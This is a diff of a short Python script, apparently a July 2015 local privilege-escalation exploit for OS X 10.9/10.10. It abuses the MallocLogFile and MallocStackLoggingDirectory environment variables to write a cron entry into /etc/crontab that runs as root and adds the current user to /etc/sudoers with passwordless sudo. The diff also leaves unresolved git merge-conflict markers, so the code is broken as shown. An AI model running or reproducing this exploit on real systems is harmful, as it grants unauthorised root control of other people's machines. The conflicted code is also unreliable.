@@ -3,8 +3,13 @@
 # tested on osx 10.9.5 / 10.10.5
 # jul/2015
 
+<<<<<<< HEAD
 import os,time,sys
 import subprocess
+=======
+import os,time,sys,subprocess
+whoami = subprocess.check_output(['whoami'])
+>>>>>>> origin/master
 env = {}
 proc = subprocess.Popen('whoami', stdout=subprocess.PIPE)
 name = proc.stdout.read()
@@ -12,7 +17,11 @@ s = os.stat("/etc/sudoers").st_size
 
 env['MallocLogFile'] = '/etc/crontab'
 env['MallocStackLogging'] = 'yes'
+<<<<<<< HEAD
 env['MallocStackLoggingDirectory'] = 'a\n* * * * * root echo " $name ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\n\n\n\n\n'
+=======
+env['MallocStackLoggingDirectory'] = 'a\n* * * * * root echo " %s ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\n\n\n\n\n' % whoami
+>>>>>>> origin/master
 
 sys.stderr.write("creating /etc/crontab..")
 
